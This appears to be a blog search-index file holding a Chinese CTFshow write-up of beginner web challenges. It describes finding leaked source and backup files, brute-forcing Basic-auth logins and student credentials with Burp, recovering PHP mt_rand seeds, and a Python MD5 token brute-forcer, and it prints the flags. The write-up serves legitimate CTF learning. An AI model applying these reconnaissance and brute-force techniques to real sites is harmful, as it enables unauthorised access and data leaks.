<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFshow-Webwp</title>
      <link href="/2024/11/16/CTFshow-Webwp/"/>
      <url>/2024/11/16/CTFshow-Webwp/</url>
      
        <content type="html"><![CDATA[<p>[Toc]</p><h1 id="Web入门"><a href="#Web入门" class="headerlink" title="Web入门"></a>Web入门</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发者开发不仔细,注释留在了前端界面,通过检查界面源代码发现漏洞和flag,得到的flag可能是编码之前的,所以需要进行base64解码或者其他方式解码</span><br></pre></td></tr></table></figure><h3 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前端进行限制,无法查看页面源代码或者检查,通过view-source:url可以查看源代码 </span><br><span class="line">通过不断刷新进行F12检查也可以开启代码检查,然后禁用JavaScript</span><br></pre></td></tr></table></figure><h3 id="web-3"><a href="#web-3" class="headerlink" title="web-3"></a>web-3</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过BP抓包,respond返回请求携带信息泄露（flag）</span><br></pre></td></tr></table></figure><h3 id="web-4"><a href="#web-4" class="headerlink" title="web-4"></a>web-4</h3><p>&#x3D;&#x3D;#如果是有明显的网站架构，可以优先扫描robots文件&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网页搜索引擎爬取网站的robots(.txt)文件,所以网站robots(.txt)文件也会信息泄露(flag)</span><br></pre></td></tr></table></figure><h3 id="web-5"><a href="#web-5" class="headerlink" title="web-5"></a>web-5</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phps文件泄露,若目录扫描到,通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容,所以需要用phps文件代替。用户访问phps文件就能看到对应的php文件的源码。其中可能有flag</span><br></pre></td></tr></table></figure><h3 id="web-6"><a href="#web-6" class="headerlink" title="web-6"></a>web-6</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站管理者处理备份文件不当,在更新网站的过程中留下了网站源码的备份文件 </span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网站备份压缩文件,漏洞成因,在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。</span><br><span class="line">当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</span><br><span class="line">该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</span><br><span class="line">该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</span><br><span class="line">被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</span><br><span class="line">网站备份文件后缀：.rar .zip .7z .tar.gz .bak .swp .txt</span><br></pre></td></tr></table></figure><h3 id="web-7"><a href="#web-7" class="headerlink" title="web-7"></a>web-7</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.gitignore (配置在git进行文件跟踪的时候忽略掉哪些文件 , 从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志/配置文件等敏感文件)</span><br><span class="line">  在一个目录中初始化一个仓库以后 , 会在这个目录下产生一个名叫 .git 的隐藏文件夹（版本库）这个文件夹里面保存了这个仓库的所有版本等一系列信息</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1. 什么是版本控制？</span><br><span class="line">版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。简单来说就是用于管理多人协同开发项目的技术。</span><br><span class="line"></span><br><span class="line">2. 为什么要有版本控制？</span><br><span class="line">没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具。（多人开发就必须要使用版本控制）</span><br><span class="line"> </span><br><span class="line"> 使用版本控制之后可以给你带来的一些便利：</span><br><span class="line">● 实现跨区域多人协同开发</span><br><span class="line">● 追踪和记载一个或者多个文件的历史记录</span><br><span class="line">● 组织和保护你的源代码和文档</span><br><span class="line">● 统计工作量</span><br><span class="line">● 并行开发、提高开发效率</span><br><span class="line">● 跟踪记录整个软件的开发过程</span><br><span class="line">● 减轻开发人员的负担，节省时间，同时降低人为错误</span><br><span class="line"></span><br><span class="line">3. 常见的版本控制工具</span><br><span class="line">   主流的版本控制器有如下这些：</span><br><span class="line">  ● Git</span><br><span class="line">  ● SVN（Subversion）</span><br><span class="line">  ● CVS（Concurrent Versions System）</span><br><span class="line">  ● VSS（Micorosoft Visual SourceSafe）</span><br><span class="line">  ● TFS（Team</span><br></pre></td></tr></table></figure><h3 id="web-8"><a href="#web-8" class="headerlink" title="web-8"></a>web-8</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这题和上一题类似,只不过这一题是SVN文件泄露</span><br></pre></td></tr></table></figure><h3 id="web-9"><a href="#web-9" class="headerlink" title="web-9"></a>web-9</h3><p>&#x3D;&#x3D;dirsearch扫描不出这个文件&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim缓存泄露,在使用vim进行编辑时,会产生缓存文件,如果网站管理员没有删.时可以通过缓存文件来得到原文件,以index.php来说,第一次退出,缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</span><br></pre></td></tr></table></figure><h3 id="web-10"><a href="#web-10" class="headerlink" title="web-10"></a>web-10</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Respond返回Cookie携带flag</span><br></pre></td></tr></table></figure><h3 id="web-11"><a href="#web-11" class="headerlink" title="web-11"></a>web-11</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名解析隐藏信息flag</span><br></pre></td></tr></table></figure><h3 id="web-12"><a href="#web-12" class="headerlink" title="web-12"></a>web-12</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要忘记robots.txt,有时候网站管理者的账号或者邮箱就是密码</span><br></pre></td></tr></table></figure><h3 id="web-13"><a href="#web-13" class="headerlink" title="web-13"></a>web-13</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多在网页点点，特别是网页底部，不要过于相信dirsearch</span><br></pre></td></tr></table></figure><h3 id="web-14"><a href="#web-14" class="headerlink" title="web-14"></a>web-14</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网页源码泄露路径,editor编辑框的上传文件里面的文件空间会泄露整个服务器文件系统，拿到网站的flag</span><br></pre></td></tr></table></figure><h3 id="web-15"><a href="#web-15" class="headerlink" title="web-15"></a>web-15</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站管理者邮箱泄露信息，通过邮箱的信息收集可能回答出密保问题</span><br></pre></td></tr></table></figure><h3 id="web-16"><a href="#web-16" class="headerlink" title="web-16"></a>web-16</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认探针为tz.php,里面可以对数据库密码进行测试，也含有phpinfo，phpinfo里面可以查看当前php的环境变量和一些函数，从而得到flag</span><br></pre></td></tr></table></figure><h3 id="web-18"><a href="#web-18" class="headerlink" title="web-18"></a>web-18</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看js文件,发现Unicode编码文件,可以F12直接console改js数值   sorce=130;game_over=false;执行run()拿到110.php,拿到flag</span><br></pre></td></tr></table></figure><h3 id="web-19"><a href="#web-19" class="headerlink" title="web-19"></a>web-19</h3><p>&#x3D;&#x3D;只要是前端验证，都可以通过bp进行抓包改包&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要忘记burp，只要是前端验证，都可以通过bp进行抓包改包，前端的js代码很重要，可以掌控很多事情，很多地方也是通过前端进行验证的,多多尝试编码格式，我这道题的编码格式是Hex</span><br></pre></td></tr></table></figure><h3 id="web-20"><a href="#web-20" class="headerlink" title="web-20"></a>web-20</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdb数据库文件泄露，mdb是早期的access和asp数据库，后缀是mdb，也别忘记在扫描出的目录后面接着扫描</span><br></pre></td></tr></table></figure><h3 id="web-21"><a href="#web-21" class="headerlink" title="web-21"></a>web-21</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql文件泄露,可以用Navicat打开</span><br></pre></td></tr></table></figure><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web-21-1"><a href="#web-21-1" class="headerlink" title="web-21"></a>web-21</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在类似表单提交的应用中</span><br><span class="line">表单数据请求应为：</span><br><span class="line">Authorization: Basic YWRtaW46cGFzc3dvcmQ=</span><br><span class="line">Basic 后面为数据,我这道题的内容格式(一般需要进行Base64解码)为(username):(password)</span><br><span class="line">我们对YWRtaW46cGFzc3dvcmQ=进行设置攻击变量</span><br><span class="line">这道题因为给的字典只有密码所以猜测username是admin</span><br><span class="line">所以在payload处理添加规则固定前缀是admin:(这里是表单数据格式)和base64编码(因为前端拦截数据进行了编码)</span><br><span class="line">因为我们前面添加规则对我们的数据进行base64编码了，则在payload编码处取消编码，免得二次编码</span><br><span class="line"></span><br><span class="line">进行攻击：</span><br><span class="line">状态码200成功回显，拿到flag</span><br></pre></td></tr></table></figure><h3 id="web-22"><a href="#web-22" class="headerlink" title="web-22"></a>web-22</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">360quake 使用空间搜索引擎360quake 搜索语法domain=&quot;ctf.show&quot; 可以搜索出子域名vip.ctf.show 可以发现子域名vip.ctf.show下面有flag---&gt;flag&#123;ctf_show_web&#125;</span><br></pre></td></tr></table></figure><h3 id="web-23"><a href="#web-23" class="headerlink" title="web-23"></a>web-23</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>：</span><br><span class="line">进入靶场后测试token=<span class="number">1</span>---&gt;http://37c4bbc1-3a2d-4e5a-a812-13a0db1e1793.challenge.ctf.show/?token=<span class="number">1</span> 然后进入intruder模块 给<span class="number">1</span>添加payload 开始爆破 发现第<span class="number">422</span>位和第<span class="number">1202</span>位长度不同 得知十分的不对劲 点进去响应包发现有flog---&gt;ctfshow&#123;f9bebf73-0d20-4d9d-a196-76390fe945d7&#125;</span><br><span class="line"></span><br><span class="line">方法<span class="number">2</span>：</span><br><span class="line">写一个脚本让它算出来实际的值</span><br><span class="line">通过给出的源代码可知，我们要传入一个参数(token)的值</span><br><span class="line">算出token的md5的值将第<span class="number">2</span>位与第<span class="number">15</span>位比较，第<span class="number">15</span>位与<span class="number">18</span>位比较(<span class="number">2</span>位=<span class="number">15</span>位=<span class="number">18</span>位)</span><br><span class="line">再算md5的整数值，(第<span class="number">2</span>位+第<span class="number">15</span>位+第<span class="number">18</span>位)/(第<span class="number">2</span>位)=(第<span class="number">32</span>位)则拿到flag</span><br><span class="line"></span><br><span class="line">编写脚本：</span><br><span class="line"><span class="keyword">import</span> hashlib  <span class="comment"># 导入 hashlib 模块以便使用哈希函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="comment"># 计算给定 token 的 MD5 哈希值，并将其转换为十六进制字符串</span></span><br><span class="line">    md5_hash = hashlib.md5(token).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查哈希值的特定字符是否相等</span></span><br><span class="line">    <span class="keyword">if</span> (md5_hash[<span class="number">1</span>] == md5_hash[<span class="number">14</span>] == md5_hash[<span class="number">17</span>]):</span><br><span class="line">        <span class="comment"># 将哈希值的第二个字符转换为十六进制整数</span></span><br><span class="line">        x = <span class="built_in">int</span>(md5_hash[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查 (3 * x) / x 是否等于哈希值的最后一个字符的十六进制整数</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">3</span> * x) / x == <span class="built_in">int</span>(md5_hash[<span class="number">31</span>], <span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果条件满足，返回 True，表示 token 有效</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果条件不满足，返回 False，表示 token 无效</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历从 0 到 999999 的所有整数，尝试作为 token</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    <span class="comment"># 将整数 i 转换为字符串并编码为字节，作为 token</span></span><br><span class="line">    token = <span class="built_in">str</span>(i).encode()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查生成的 token 是否有效</span></span><br><span class="line">    <span class="keyword">if</span> is_valid_token(token):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Valid token found: <span class="subst">&#123;i&#125;</span>&quot;</span>)  <span class="comment"># 打印找到的有效 token</span></span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 找到有效 token 后退出循环</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;一定要有自己读代码的能力和写脚本的能力&#x3D;&#x3D;</p><h4 id="inval函数说明"><a href="#inval函数说明" class="headerlink" title="inval函数说明"></a>inval函数说明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>() 函数用于获取变量的整数值。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">intval</span>() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 数值。 <span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。</span><br><span class="line">PHP <span class="number">4</span>, PHP <span class="number">5</span>, PHP <span class="number">7</span></span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line"><span class="variable">$var</span>：要转换成 <span class="keyword">integer</span> 的数量值。</span><br><span class="line"><span class="variable">$base</span>：转化所使用的进制。</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line"></span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">返回值</span><br><span class="line">成功时返回 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">最大的值取决于操作系统。 <span class="number">32</span> 位系统最大带符号的 <span class="keyword">integer</span> 范围是 -<span class="number">2147483648</span> 到 <span class="number">2147483647</span>。举例，在这样的系统上， <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1000000000000&#x27;</span>) 会返回 <span class="number">2147483647</span>。<span class="number">64</span> 位系统上，最大带符号的 <span class="keyword">integer</span> 值是 <span class="number">9223372036854775807</span>。</span><br><span class="line">字符串有可能返回 <span class="number">0</span>，虽然取决于字符串最左侧的字符。</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">1e10</span>);                    <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web-24"><a href="#web-24" class="headerlink" title="web-24"></a>web-24</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里要注意 需要知道伪随机数的概念 如果随机数种子定了 那么产生的随机数就是确定的 这里有个坑 php版本不一定要和靶场一样 网上找一个那种php在线运行环境即可</span><br><span class="line"></span><br><span class="line">phpstudy的目录索引功能的开启不是要删除目录首页读取的，只用删除文件里面的目录首页就可以了</span><br></pre></td></tr></table></figure><h4 id="mt-rand函数说明"><a href="#mt-rand函数说明" class="headerlink" title="mt_rand函数说明"></a>mt_rand函数说明</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">高版本已经弃用了这个函数，因为这个函数生成的是伪随机数，会根据系统生成随机数，只要随机数种子固定，生成的这个随机数也是固定的</span><br><span class="line">如果再次调用的话会再次进行伪随机</span><br></pre></td></tr></table></figure><p><a href="https://www.openwall.com/php_mt_seed/" title="https://www.openwall.com/php_mt_seed/ ">根据随机数爆出随机种子</a>这个工具我下载在了kali上，以下是它的用法：</p><h3 id="web-25"><a href="#web-25" class="headerlink" title="web-25"></a>web-25</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据源码可知，开始令r=0可以得到一个随机数，但是后面要修改token的cookie使之等于第二次随机数和第三次随机数之和</span><br><span class="line">Cookie: token=随机数之和</span><br><span class="line">使用php_mt_seed爆出随机种子</span><br></pre></td></tr></table></figure><p><img src="D:\Blog\blog\source\images\php_mt_seed.png" alt="image-20241104211436741"></p><h3 id="web-26"><a href="#web-26" class="headerlink" title="web-26"></a>web-26</h3><p>&#x3D;&#x3D;多bp手动抓包，然后观察正常页面没有的页面（这题是checkdb.php），虽然不一定能访问，但是能分析&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常爆破数据库密码就行了</span><br></pre></td></tr></table></figure><h3 id="web-27"><a href="#web-27" class="headerlink" title="web-27"></a>web-27</h3><p>&#x3D;&#x3D;不要用单一浏览器抓包,Chrome&gt;firefox&gt;edge&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先登录界面，发现有爆破信息(给了一部分学生信息),又有爆破点(学生信息查询界面),尝试对学生信息进行爆破</span><br><span class="line">用burp抓包post请求，修改post请求，进行日期爆破</span><br><span class="line"></span><br><span class="line">日期格式：yyyyMMdd#y:年份,M:月份,d:天</span><br><span class="line">抓取回显长度不同的Unicode解码</span><br><span class="line">拿到学号和密码进入系统,拿到flag</span><br><span class="line"></span><br><span class="line">\u989d\nsdsd9\:一般都是Unicode编码</span><br></pre></td></tr></table></figure><h3 id="web-28"><a href="#web-28" class="headerlink" title="web-28"></a>web-28</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">302状态码：</span><br><span class="line">HTTP 状态码 302 表示临时重定向（Found），即客户端请求的资源暂时位于另一个 URL，且未来的请求可能会继续使用原始 URL。</span><br><span class="line"></span><br><span class="line">302 状态码的作用：</span><br><span class="line">临时重定向：当服务器返回 302 响应时，它告诉客户端请求的资源已被暂时移至新的 URL，但这个移动是临时的。客户端在将来仍然应该继续使用原始 URL 进行请求。</span><br><span class="line">搜索引擎优化（SEO）：与 301 永久重定向不同，302 重定向通常不会影响搜索引擎对原始 URL 的排名，因为它表明资源将在未来可能恢复使用原 URL。因此，搜索引擎不会将排名从旧 URL 转移到新 URL。</span><br><span class="line">浏览器行为：当浏览器收到 302 响应时，它会自动重定向到新的 URL，但在以后的请求中仍然使用原 URL。</span><br><span class="line">例子：</span><br><span class="line">假设你访问了 http://example.com/page，服务器返回 302 状态码并提供一个临时的新 URL http://example.com/temporary-page，那么浏览器会跳转到新 URL，但它会继续使用原 URL 进行后续请求。</span><br><span class="line"></span><br><span class="line">302 与 301 区别：</span><br><span class="line">302 是临时重定向，意味着资源可能会在未来恢复使用原 URL，搜索引擎排名不会发生变化。</span><br><span class="line">301 是永久重定向，意味着资源已永久迁移到新 URL，搜索引擎会将排名转移到新 URL。</span><br><span class="line">常见场景：</span><br><span class="line">维护模式：如果网站正在进行维护，临时将访问者重定向到一个维护页面，之后会恢复正常页面。</span><br><span class="line">A/B 测试：网站可能会临时将流量导向不同的页面版本进行测试，测试结束后会恢复使用原 URL。</span><br><span class="line">临时内容变化：当一个资源的内容或位置暂时改变时，使用 302 重定向指向新的位置，未来可能恢复原地址。</span><br><span class="line"></span><br><span class="line">302 和其他临时重定向的区别：</span><br><span class="line">301 与 302 都是重定向状态码，但 302 更明确地表示资源是临时的。</span><br><span class="line">也有其他类似的临时重定向状态码，如 303 (See Other) 和 307 (Temporary Redirect)，它们在行为上有一些细微的不同，但整体上都表示重定向是临时的。</span><br><span class="line">总的来说，302 状态码适用于当你知道资源位置会发生变化，但又不想立即影响搜索引擎排名时。</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这道题是将302重定向回到了原url，然而原url也没有此资源，结果又重定向到新url，新url又重定向到原url，就一直循环</span><br><span class="line"></span><br><span class="line">这道题我们要将请求的资源去掉进行攻击，也就是2.txt去掉，这样无法的访问的就返回403，就成功找到了url，拿到flag</span><br></pre></td></tr></table></figure><h2 